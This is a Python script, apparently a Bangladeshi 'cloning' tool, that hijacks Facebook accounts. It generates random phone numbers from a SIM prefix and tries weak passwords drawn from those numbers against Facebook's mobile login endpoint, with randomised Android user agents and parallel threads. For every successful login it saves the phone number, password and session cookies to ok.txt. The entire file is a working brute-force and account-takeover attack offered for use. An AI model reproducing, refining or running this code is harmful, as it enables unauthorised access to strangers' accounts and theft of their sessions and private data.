import os, time, sys, random, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Color Codes
G = '\033[1;32m'; W = '\033[1;37m'; R = '\033[1;31m'; Y = '\033[1;33m'; B = '\033[1;34m'
loop = 0; ok = []

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
| [✓] OWNER        : MD MALEK ISLAM (JILANI)   |
| [✓] REFACTOR     : REAL LOGIC APPLIED        |
| [✓] METHOD       : TOUCH-ASYNC RESPONSE      |
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")

def main():
    banner()
    print(f'{G}[1] START PROFESSIONAL CLONING')
    print(f'[0] EXIT')
    choose = input(f'{Y}[▼] CHOOSE : {W}')
    if choose == '1':
        cloning_start()
    else: sys.exit()

def cloning_start():
    banner()
    code = input(f'{G}[+] ENTER SIM CODE (Ex: 017): {W}')
    limit = int(input(f'{G}[•] PUT CLONING LIMIT: {W}'))
    
    banner()
    print(f'{G}[✓] REFACTOR LOGIC IN PROGRESS...')
    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}\n')

    with ThreadPool(max_workers=5) as pool:
        for _ in range(limit):
            num = "".join(random.choice("0123456789") for _ in range(8))
            uid = code + num
            pws = [uid[-6:], uid] 
            pool.submit(login_engine, uid, pws, limit)

def login_engine(uid, pws, limit):
    global loop, ok
    sys.stdout.write(f'\r{G}[MALEK-AI] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    for pas in pws:
        session = requests.Session()
        ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,13)}; SM-A{random.randint(100,500)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,126)}.0.0.0 Mobile Safari/537.36"
        
        headers = {
            'authority': 'touch.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'referer': 'https://touch.facebook.com/login/',
            'user-agent': ua,
        }
        
        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        data = {
            "lsd": "AVpY", 
            "jazoest": "2931", 
            "m_ts": str(int(time.time())),
            "email": uid, 
            "pass": pas
        }

        try:
            response = session.post(url, data=data, headers=headers, timeout=30)
            
            if "c_user" in session.cookies.get_dict():
                kuki = (";").join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                print(f'\n{G}[MALEK-OK💚] {uid} • {pas}') 
                print(f'{G}[🍪] COOKIE = {kuki}\n')
                ok.append(uid)
                with open('ok.txt', 'a') as f:
                    f.write(f'{uid}|{pas}|{kuki}\n')
                break
        except:
            pass
            
    loop += 1

if __name__ == "__main__":
    main()
